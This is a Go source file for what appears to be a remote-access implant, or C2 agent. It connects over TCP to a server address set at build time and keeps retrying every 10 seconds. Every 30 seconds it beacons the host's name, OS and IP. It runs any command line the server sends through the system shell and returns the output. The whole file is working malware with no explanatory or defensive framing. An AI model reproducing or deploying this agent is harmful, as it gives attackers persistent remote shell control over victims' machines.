package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/google/uuid"
)

type PacketType string

const (
	TypeBeacon   PacketType = "BEACON"
	TypeCommand  PacketType = "COMMAND"
	TypeResponse PacketType = "RESPONSE"
)

type Packet struct {
	Type    PacketType      `json:"type"`
	AgentID string          `json:"agent_id"`
	Payload json.RawMessage `json:"payload"`
}

var agentID = uuid.New().String()
var serverAddr = "localhost:5555" // Overridden during build

func main() {
	for {
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		handleServer(conn)
	}
}

func handleServer(conn net.Conn) {
	defer conn.Close()

	// Initial Beacon
	sendBeacon(conn)

	// Keep-alive/Command loop
	reader := bufio.NewReader(conn)
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	go func() {
		for range ticker.C {
			sendBeacon(conn)
		}
	}()

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		var packet Packet
		json.Unmarshal([]byte(message), &packet)

		if packet.Type == TypeCommand {
			var cmdPayload struct {
				ID   int    `json:"id"`
				Line string `json:"line"`
			}
			json.Unmarshal(packet.Payload, &cmdPayload)
			
			output := executeCommand(cmdPayload.Line)
			sendResponse(conn, cmdPayload.ID, output)
		}
	}
}

func sendBeacon(conn net.Conn) {
	hostname, _ := os.Hostname()
	payload := map[string]string{
		"hostname":     hostname,
		"os":           runtime.GOOS,
		"ip":           conn.LocalAddr().String(),
		"country_code": "US", // Placeholder
	}
	payloadBytes, _ := json.Marshal(payload)
	packet := Packet{
		Type:    TypeBeacon,
		AgentID: agentID,
		Payload: payloadBytes,
	}
	packetBytes, _ := json.Marshal(packet)
	conn.Write(append(packetBytes, '\n'))
}

func sendResponse(conn net.Conn, cmdID int, output string) {
	payload := map[string]interface{}{
		"command_id": cmdID,
		"output":     output,
	}
	payloadBytes, _ := json.Marshal(payload)
	packet := Packet{
		Type:    TypeResponse,
		AgentID: agentID,
		Payload: payloadBytes,
	}
	packetBytes, _ := json.Marshal(packet)
	conn.Write(append(packetBytes, '\n'))
}

func executeCommand(line string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", line)
	} else {
		cmd = exec.Command("sh", "-c", line)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, string(output))
	}
	return string(output)
}
